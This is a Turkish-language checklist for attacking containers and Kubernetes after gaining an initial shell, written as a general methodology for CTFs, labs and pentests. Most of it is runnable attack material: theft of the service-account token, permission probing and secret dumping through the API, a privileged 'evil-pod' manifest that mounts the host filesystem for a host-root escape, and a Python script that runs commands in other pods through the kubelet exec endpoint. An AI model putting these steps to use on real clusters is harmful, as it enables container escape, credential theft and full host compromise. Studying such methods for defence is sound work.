# İlk Shell Sonrası: Konteyner & Kubernetes Checklist (Genel / Makineden Bağımsız)

> Bu, belirli bir makineye özel değildir. Bir web zafiyetiyle **ilk shell'i aldığın** her
> durumda uygulanabilen genel bir metodolojidir. Mantığı anla, ezberleme.
>
> **Altın kural:** Önce **Nerede** → sonra **Ne yapabiliyorum** → en son **Sömür.**
> Rastgele exploit deneme; keşif (enumeration) kazandıran şeydir.

---

## Aşama 1 — "Neredeyim?" (Ortam tespiti)

Shell aldığında 3 yerden birinde olabilirsin: **normal makine**, **Docker konteyneri**,
ya da **Kubernetes pod'u**. Aşağıdakileri sırayla çalıştır.

```bash
# Kimlik ve isim
id
whoami
hostname                       # Rastgele/garip isim (örn. app-7d9f8b6c4-x2k9p) → konteyner/pod işareti

# Docker konteyneri miyim?
ls -la /.dockerenv             # Bu dosya varsa → Docker konteyneri
cat /proc/1/cgroup             # İçinde "docker" / "kubepods" geçiyorsa → konteyner/pod

# Kubernetes pod'u muyum? (EN ÖNEMLİ)
ls -la /var/run/secrets/kubernetes.io/serviceaccount/   # Bu klasör varsa → kesin pod
env | grep -i kube             # KUBERNETES_SERVICE_HOST vb. → Kubernetes
```

**Karar:**
- [ ] Kubernetes işareti **yok** → **Aşama 5** (klasik privesc / konteyner escape).
- [ ] Kubernetes işareti **var** → **Aşama 2**'den devam.

---

## Aşama 2 — Kimlik dosyalarını al

Her pod'a Kubernetes otomatik bir "kimlik kartı" verir: 3 dosya.

```bash
ls /var/run/secrets/kubernetes.io/serviceaccount/
# token      → senin kimliğin (JWT)
# ca.crt     → API sunucusunun sertifikası
# namespace  → bulunduğun bölme (örn. "default")
```

İşi kolaylaştırmak için değişkenlere al:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT
```

---

## Aşama 3 — "Bu kimlikle NE yapabiliyorum?" (İzin keşfi)

**En kritik adım.** Token'ın gücünü bilmeden hiçbir yere gidemezsin.

```bash
# kubectl varsa (kolay):
which kubectl && kubectl auth can-i --list

# kubectl yoksa (çoğu zaman) — curl ile sor:
curl -sk -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NS\"}}"
```

Çıktıda **verbs** (yapabildiğin eylemler: get, list, create, ...) ve **resources**
(nesneler: pods, secrets, nodes/proxy, ...) listelenir. Bu liste yolunu belirler.

Ek keşif komutları (izin varsa çalışır, yoksa hata döner — denemekten zarar gelmez):
```bash
# Namespace'leri listele
curl -sk "$API/api/v1/namespaces" -H "Authorization: Bearer $TOKEN"
# Bu namespace'teki pod'lar
curl -sk "$API/api/v1/namespaces/$NS/pods" -H "Authorization: Bearer $TOKEN"
# Secret'lar (şifreler/token'lar buradadır)
curl -sk "$API/api/v1/namespaces/$NS/secrets" -H "Authorization: Bearer $TOKEN"
```

---

## Aşama 4 — İzne göre kapı seç (Genel yol tablosu)

İzin listesinde ne gördüğüne göre farklı bir kapı açılır. Sırasıyla dene:

| İzinde bunu görürsen | Ne anlama gelir / Ne denersin |
|---|---|
| `secrets` (get/list) | **Önce buna bak.** Diğer servislerin şifre/token'ları burada. Genelde daha yetkili yeni token'lar bulunur → zincir uzar. |
| `pods` (create) | Kendi pod'unu yaratabilirsin → host diskini mount eden **privileged bir pod** oluşturup host'a çıkarsın (Aşama 4.1). |
| `pods/exec` (create) | Var olan başka pod'ların içine komut sokabilirsin (özellikle privileged olan varsa). |
| `nodes/proxy` (get) | Kubelet'e (port 10250) doğrudan komut yollayabilirsin → privileged pod'da exec (Aşama 4.2). |
| `pods` (list/get) | Doğrudan escape değil ama keşif altını doldurur: privileged pod ve mount'ları bulursun. |
| `*` / cluster-admin | Her şeyi yapabilirsin. Oyun bitti. |
| İşe yarar izin yok | Bu yoldan gitme → **Aşama 5** (mount'lar, docker.sock, klasik privesc). |

> **Ortak hedef:** Nasıl gidersen git, amaç host makinenin diskine erişmek. Bunu sağlayan
> şey neredeyse her zaman **`privileged: true` + `hostPath` ile host'u mount etmiş bir pod**.

### 4.1 — `pods create` iznin varsa: kendi privileged pod'unu yarat

Host'un `/` dizinini içine mount eden, privileged bir pod tanımı yaz (`evil-pod.yaml`):

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
spec:
  containers:
  - name: evil
    image: alpine        # cluster'da mevcut/çekilebilir herhangi bir imaj
    command: ["/bin/sh", "-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /            # host'un kök dizini pod içinde /host olur
```

API'ye gönder (kubectl yoksa curl ile POST edersin), sonra pod'a exec olup host'u oku:
```bash
kubectl apply -f evil-pod.yaml          # kubectl varsa
kubectl exec -it evil-pod -- chroot /host bash   # host root'una geç
# /host altında host'un tüm dosya sistemi vardır → root
```

### 4.2 — `nodes/proxy` iznin varsa: kubelet üzerinden exec

Bu izin, her node'da çalışan **kubelet** servisine (port `10250`) doğrudan istek
göndermene izin verir. Plan: host'u mount etmiş privileged bir pod bul → içinde komut çalıştır.

**Adım 1 — Privileged + hostPath'li pod ara** (değerleri kendi ortamına göre değiştir):
```bash
curl -sk "https://$KUBERNETES_SERVICE_HOST:10250/pods" \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data['items']:
    ns   = item['metadata']['namespace']
    name = item['metadata']['name']
    vols = [v for v in item['spec'].get('volumes', []) if 'hostPath' in v]
    for c in item['spec']['containers']:
        csc = c.get('securityContext', {})
        if csc.get('privileged') and vols:
            paths = [v['hostPath']['path'] for v in vols]
            print(f'[!] PRIVILEGED: {ns}/{name} - container: {c[\"name\"]} - hostPaths: {paths}')
"
```
`hostPath` içinde `/` gören bir pod = host diskinin tamamı orada (genelde `/host/...` altında).

**Adım 2 — Kubelet'in exec özelliğiyle o pod'da komut çalıştır.** Değişkenleri (NODE, NS,
POD, CNT) yukarıda bulduğun değerlerle doldur:
```python
# kube_exec.py
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets
NODE  = "NODE_IP"          # <-- hedef node/host IP
NS    = "NAMESPACE"        # <-- bulduğun pod'un namespace'i
POD   = "POD_ADI"          # <-- bulduğun pod adı
CNT   = "CONTAINER_ADI"    # <-- container adı
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'

async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    args = "&".join(f"command={part}" for part in cmd_parts)
    url = (f"wss://{NODE}:10250/exec/{NS}/{POD}/{CNT}?output=1&error=1&{args}")
    async with websockets.connect(
        url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"], open_timeout=10
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
                    sys.stdout.flush()
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass
asyncio.run(ws_exec(COMMAND.split()))
```
```bash
python3 kube_exec.py "id"
python3 kube_exec.py "cat /host/root/root.txt"   # host'un dosyalarını oku → root
```

### 4.3 — `secrets` iznin varsa: kimlik bilgisi topla

```bash
curl -sk "$API/api/v1/namespaces/$NS/secrets" -H "Authorization: Bearer $TOKEN"
```
Secret değerleri **base64** kodludur, çözmek için:
```bash
echo "<base64_deger>" | base64 -d
```
Bulduğun daha yetkili bir token'ı Aşama 3'e geri sokup izinleri yeniden sor — zincir uzar.

---

## Aşama 5 — Kubernetes işe yaramazsa / pod değilsen: klasik kontroller

```bash
# Docker soketi mount edilmiş mi? Varsa direkt host root demektir:
ls -la /var/run/docker.sock

# Host diski zaten bir yere mount edilmiş mi?
mount | grep -iE "host|/root|/etc"
ls -la /host 2>/dev/null

# Ne kadar yetkili bir konteynerim? (Capabilities)
cat /proc/self/status | grep CapEff
capsh --print 2>/dev/null

# Klasik Linux privilege escalation:
sudo -l                                    # sudo ile ne çalıştırabiliyorum?
find / -perm -4000 -type f 2>/dev/null     # SUID binary'ler
# Otomatik araçlar: linpeas.sh (Linux), deepce (konteyner)
```

---

## Akış şeması

```
İlk shell alındı
      │
      ▼
[1] id / hostname / env / ls -la /            ← "Neredeyim?"
      │
      ├── Kubernetes işareti YOK ──► [5] klasik privesc / konteyner escape
      │
      └── /var/run/secrets/kubernetes.io VAR
                │
                ▼
        [2] TOKEN / CA / NS / API değişkenlerini al
                │
                ▼
        [3] selfsubjectrulesreviews          ← "Ne yapabiliyorum?"
                │
                ▼
        [4] İzne göre kapı seç:
              secrets      → kimlik topla, zinciri uzat
              pods create  → kendi privileged pod'unu yarat → host root
              pods/exec    → başka pod'a komut sok
              nodes/proxy  → kubelet exec → privileged pod → host root
              cluster-admin→ oyun bitti
```

---

## 7 kritik hatırlatma

1. **Sıra önemli:** Nerede → Ne → Sömür. Rastgele exploit atma.
2. **Web aşamasında Kubernetes'i düşünme.** İç ağdadır; ancak shell aldıktan *sonra* görünür.
   (Tek istisna: SSRF ile dolaylı erişim.)
3. **Token'ın izni her ortamda farklıdır.** Tek bir "sihirli komut" yok. Her zaman önce
   `selfsubjectrulesreviews` ile izinleri sor, sonra tablodan kapını seç.
4. **`hostPath: /` + `privileged: true` = altın kombinasyon.** Bir pod host diskini içine
   almışsa, ona komut sokabilmek = host'a root erişim.
5. **`secrets` iznini küçümseme.** Genelde daha yetkili token'lar oradan çıkar ve zincir uzar.
6. **Enumeration sıkıcı ama kazandıran şeydir.** Exploit'i herkes bulur; asıl iş sabırla
   "nerede ne var" sorusunu cevaplamaktır.
7. **Sadece yetkili ortamlarda kullan** (CTF / lab / izinli pentest).

---

*Genel Kubernetes/konteyner post-exploitation metodolojisi. Değerler (IP, pod adı, namespace)
her ortamda değişir — komutları kendi hedefine göre uyarla.*
